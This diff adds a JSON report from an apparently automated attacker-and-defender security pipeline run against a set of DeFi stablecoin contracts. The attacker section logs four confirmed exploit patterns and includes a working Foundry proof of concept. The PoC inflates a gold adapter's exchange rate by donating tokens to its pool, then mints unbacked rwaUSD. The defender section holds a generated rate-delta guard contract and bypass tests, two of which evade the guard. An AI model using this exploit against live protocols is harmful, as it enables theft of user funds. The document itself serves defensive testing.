@@ -1,0 +1,188 @@
+{
+  "status": "hardened",
+  "iteration": 2,
+  "target_contracts": [
+    "rwaUSDToken",
+    "Ledger",
+    "AccountManager",
+    "GoldAdapter",
+    "xStockAdapter",
+    "PriceRouter"
+  ],
+  "advisories_generated": 2,
+  "coverage_warnings_flagged": 9,
+  "attacker": {
+    "pattern_name": "stale_price_multicall",
+    "progress": {
+      "current": 2,
+      "total": 4
+    },
+    "log": [
+      "agent=fallback | patterns=4 | budget=$2.00",
+      "=== pattern: adapter_donation (Vuln A) ===",
+      "recon goldAdapter -> GoldAdapter: 5 functions; flags=['has_exchangeRate', 'rate_reads_pool_balance', 'price_passed_in_not_rederived']",
+      "preconditions met for adapter_donation",
+      "attempt 1: instantiating template for adapter_donation",
+      "adapter_donation CONFIRMED: EXPLOIT CONFIRMED (profit $46,000)",
+      "=== pattern: unit_composition_error (Vuln B) ===",
+      "recon xstockAdapter -> xStockAdapter: 5 functions; flags=['has_exchangeRate', 'rate_reads_pool_balance', 'price_passed_in_not_rederived', 'has_rebase_multiplier']",
+      "recon PriceRouter -> PriceRouter: 2 functions; flags=['has_getPrice', 'has_rebase_multiplier']",
+      "preconditions met for unit_composition_error",
+      "attempt 1: instantiating template for unit_composition_error",
+      "unit_composition_error CONFIRMED: EXPLOIT CONFIRMED (profit $950,000)",
+      "=== pattern: stale_price_multicall (Vuln C) ===",
+      "recon AccountManager -> AccountManager: 4 functions; flags=['has_multicall_depositAndMint']",
+      "recon goldAdapter -> GoldAdapter: 5 functions; flags=['has_exchangeRate', 'rate_reads_pool_balance', 'price_passed_in_not_rederived']",
+      "preconditions met for stale_price_multicall",
+      "attempt 1: instantiating template for stale_price_multicall",
+      "stale_price_multicall CONFIRMED: EXPLOIT CONFIRMED (profit $46,000)",
+      "=== pattern: accrual_type_mismatch (Vuln D) ===",
+      "recon xstockAdapter -> xStockAdapter: 5 functions; flags=['has_exchangeRate', 'rate_reads_pool_balance', 'price_passed_in_not_rederived', 'has_rebase_multiplier']",
+      "recon PriceRouter -> PriceRouter: 2 functions; flags=['has_getPrice', 'has_rebase_multiplier']",
+      "preconditions met for accrual_type_mismatch",
+      "attempt 1: instantiating template for accrual_type_mismatch",
+      "accrual_type_mismatch CONFIRMED: EXPLOIT CONFIRMED"
+    ],
+    "tool_calls": [
+      {
+        "name": "decompile",
+        "args": "{\"target\": \"goldAdapter\"}",
+        "result": "GoldAdapter: 5 functions; flags=['has_exchangeRate', 'rate_reads_pool_balance', 'price_passed_in_not_rederived']"
+      },
+      {
+        "name": "fork_and_execute",
+        "args": "{\"pattern\": \"adapter_donation\", \"attempt\": 1}",
+        "result": "EXPLOIT CONFIRMED (profit $46,000)"
+      },
+      {
+        "name": "decompile",
+        "args": "{\"target\": \"xstockAdapter\"}",
+        "result": "xStockAdapter: 5 functions; flags=['has_exchangeRate', 'rate_reads_pool_balance', 'price_passed_in_not_rederived', 'has_rebase_multiplier']"
+      },
+      {
+        "name": "decompile",
+        "args": "{\"target\": \"PriceRouter\"}",
+        "result": "PriceRouter: 2 functions; flags=['has_getPrice', 'has_rebase_multiplier']"
+      },
+      {
+        "name": "fork_and_execute",
+        "args": "{\"pattern\": \"unit_composition_error\", \"attempt\": 1}",
+        "result": "EXPLOIT CONFIRMED (profit $950,000)"
+      },
+      {
+        "name": "decompile",
+        "args": "{\"target\": \"AccountManager\"}",
+        "result": "AccountManager: 4 functions; flags=['has_multicall_depositAndMint']"
+      },
+      {
+        "name": "decompile",
+        "args": "{\"target\": \"goldAdapter\"}",
+        "result": "GoldAdapter: 5 functions; flags=['has_exchangeRate', 'rate_reads_pool_balance', 'price_passed_in_not_rederived']"
+      },
+      {
+        "name": "fork_and_execute",
+        "args": "{\"pattern\": \"stale_price_multicall\", \"attempt\": 1}",
+        "result": "EXPLOIT CONFIRMED (profit $46,000)"
+      },
+      {
+        "name": "decompile",
+        "args": "{\"target\": \"xstockAdapter\"}",
+        "result": "xStockAdapter: 5 functions; flags=['has_exchangeRate', 'rate_reads_pool_balance', 'price_passed_in_not_rederived', 'has_rebase_multiplier']"
+      },
+      {
+        "name": "decompile",
+        "args": "{\"target\": \"PriceRouter\"}",
+        "result": "PriceRouter: 2 functions; flags=['has_getPrice', 'has_rebase_multiplier']"
+      },
+      {
+        "name": "fork_and_execute",
+        "args": "{\"pattern\": \"accrual_type_mismatch\", \"attempt\": 1}",
+        "result": "EXPLOIT CONFIRMED"
+      }
+    ],
+    "poc_code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"./Setup.t.sol\";\n\ncontract _AgentExploit_dda95bd38c is Setup {\n    function testExploit() public {\n        address atk = makeAddr(\"rq_atk_c\");\n        goldToken.mint(atk, 231_000e18);\n        vm.startPrank(atk);\n        uint256 fairPrice = priceRouter.getPrice(address(goldAdapter)).price;\n        goldToken.transfer(goldPool, 230_000e18);        // move the rate before the single price read\n        goldToken.approve(address(goldAdapter), 1e18);\n        uint256 minted = accountManager.depositAndMint(address(goldAdapter), 1e18);\n        vm.stopPrank();\n        uint256 fairCollateralValue = 1e18 * fairPrice / 1e18;\n        uint256 unbacked = minted - fairCollateralValue;\n        console2.log(\"minted\", minted);\n        console2.log(\"PROFIT_USD\", unbacked);\n        require(minted > fairCollateralValue * 10, \"multicall not exploitable\");\n    }\n\n}\n",
+    "result": {
+      "found": true,
+      "profit_usd": 46000.00000000001
+    }
+  },
+  "defender": {
+    "trace_diff": [
+      {
+        "variable": "GoldAdapter.exchangeRate",
+        "benign_max": "0",
+        "exploit_delta": "2.3e+05",
+        "z_score": null,
+        "anomalous": true
+      },
+      {
+        "variable": "GoldAdapter.pool.balance",
+        "benign_max": "1.577e+21",
+        "exploit_delta": "2.3e+23",
+        "z_score": 2177.5,
+        "anomalous": true
+      },
+      {
+        "variable": "GoldToken.balanceOf",
+        "benign_max": "1.577e+21",
+        "exploit_delta": "2.3e+23",
+        "z_score": 2177.5,
+        "anomalous": true
+      },
+      {
+        "variable": "Ledger.principal",
+        "benign_max": "2.854e+24",
+        "exploit_delta": "4.8e+22",
+        "z_score": -0.1,
+        "anomalous": false
+      },
+      {
+        "variable": "rwaUSDToken.balanceOf",
+        "benign_max": "2.854e+24",
+        "exploit_delta": "4.8e+22",
+        "z_score": -0.1,
+        "anomalous": false
+      },
+      {
+        "variable": "rwaUSDToken.totalSupply",
+        "benign_max": "2.854e+24",
+        "exploit_delta": "4.8e+22",
+        "z_score": -0.1,
+        "anomalous": false
+      }
+    ],
+    "candidate_invariant": {
+      "name": "ExchangeRateDeltaBound_D5C853",
+      "solidity": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"../src/GoldAdapter.sol\";\n\n/// @notice Generated by invariants/generators.py::exchange_rate_delta_bound\n/// Adapter 0xa513E6E4b8f2a923D98304ec87F64353C4D5C853  Max delta 1590 bps  Window 1 block(s)\ncontract ExchangeRateDeltaBound_D5C853Guard {\n    GoldAdapter public immutable adapter;\n    uint256 public constant MAX_DELTA_BPS = 1590;\n    uint256 public constant WINDOW_BLOCKS = 1;\n\n    uint256 public checkpointRate;\n    uint256 public checkpointBlock;\n\n    constructor(GoldAdapter _adapter) { adapter = _adapter; }\n\n    error ExchangeRateDeltaViolation(uint256 rateBefore, uint256 rateAfter, uint256 deltaBps);\n\n    modifier assertRateDeltaBound() {\n        if (checkpointBlock == 0 || block.number >= checkpointBlock + WINDOW_BLOCKS) {\n            checkpointRate = adapter.exchangeRate();\n            checkpointBlock = block.number;\n        }\n        uint256 rateBefore = checkpointRate;\n        _;\n        uint256 rateAfter = adapter.exchangeRate();\n        uint256 delta = rateAfter > rateBefore ? rateAfter - rateBefore : rateBefore - rateAfter;\n        uint256 deltaBps = rateBefore == 0 ? 0 : (delta * 10000) / rateBefore;\n        if (deltaBps > MAX_DELTA_BPS) revert ExchangeRateDeltaViolation(rateBefore, rateAfter, deltaBps);\n    }\n}\n"
+    },
+    "validation": {
+      "checked": 907,
+      "total": 2000,
+      "violations": 0
+    },
+    "threshold": {
+      "max_observed_pct": 1.59,
+      "threshold_pct": 15.9,
+      "margin_ratio": 10.0
+    },
+    "bypass_results": [
+      {
+        "strategy": "split_into_10_subtransactions",
+        "passed": false
+      },
+      {
+        "strategy": "spread_across_20_blocks",
+        "passed": true
+      },
+      {
+        "strategy": "use_multicall_path",
+        "passed": true
+      },
+      {
+        "strategy": "gas_variance",
+        "passed": false
+      }
+    ],
+    "guard_deployed": true
+  }
+}
